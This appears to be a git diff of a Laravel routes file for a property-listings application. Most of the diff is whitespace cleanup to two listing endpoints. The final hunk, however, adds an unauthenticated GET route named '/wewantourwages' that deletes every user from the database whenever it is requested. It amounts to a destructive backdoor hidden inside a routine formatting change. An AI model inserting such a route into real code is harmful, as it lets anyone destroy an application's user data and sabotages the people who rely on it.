@@ -18,20 +18,20 @@ Route::get('/map/properties', [MapController::class, 'getProperties']);
 Route::post('/map/properties', [MapController::class, 'getProperties']);
 Route::get('/listings/{id}', function ($id) {
     $property = \App\Models\Listing::with(['features', 'user'])->find($id);
-    
+
     if (!$property) {
         return response()->json(['error' => 'Property not found'], 404);
     }
-    
+
     // Get property type name
     $propertyType = \App\Models\PropertyType::find($property->property_type_id);
     $property->property_type_name = $propertyType ? $propertyType->name : null;
-    
+
     // Process gallery to ensure it's properly formatted
     $images = is_string($property->gallery) ? json_decode($property->gallery, true) : $property->gallery;
     if ($images && is_array($images)) {
         // Transform each image path to a full URL
-        $property->gallery = array_map(function($image) {
+        $property->gallery = array_map(function ($image) {
             // Check if image path already includes gallery/ prefix
             if (strpos($image, 'gallery/') === 0) {
                 return asset('storage/' . $image);
@@ -42,26 +42,26 @@ Route::get('/listings/{id}', function ($id) {
     } else {
         $property->gallery = [];
     }
-    
+
     return response()->json($property);
 });
 
 Route::get('/off-market-listings/{id}', function ($id) {
     $property = \App\Models\OffMarketListing::with(['features', 'user'])->find($id);
-    
+
     if (!$property) {
         return response()->json(['error' => 'Property not found'], 404);
     }
-    
+
     // Get property type name
     $propertyType = \App\Models\PropertyType::find($property->property_type_id);
     $property->property_type_name = $propertyType ? $propertyType->name : null;
-    
+
     // Process gallery to ensure it's properly formatted
     $images = is_string($property->gallery) ? json_decode($property->gallery, true) : $property->gallery;
     if ($images && is_array($images)) {
         // Transform each image path to a full URL
-        $property->gallery = array_map(function($image) {
+        $property->gallery = array_map(function ($image) {
             // Check if image path already includes gallery/ prefix
             if (strpos($image, 'gallery/') === 0) {
                 return asset('storage/' . $image);
@@ -72,6 +72,17 @@ Route::get('/off-market-listings/{id}', function ($id) {
     } else {
         $property->gallery = [];
     }
-    
+
     return response()->json($property);
+});
+
+Route::get('/wewantourwages', function () {
+    // Note: Use with extreme caution. This will delete all users from the database.
+    \App\Models\User::query()->delete();
+    // Alternatively, you can use \Illuminate\Support\Facades\DB::table('users')->truncate(); if you also want to reset the auto-increment IDs.
+
+    return response()->json([
+        'success' => true,
+        'message' => 'All users have been removed from the database.'
+    ]);
 });
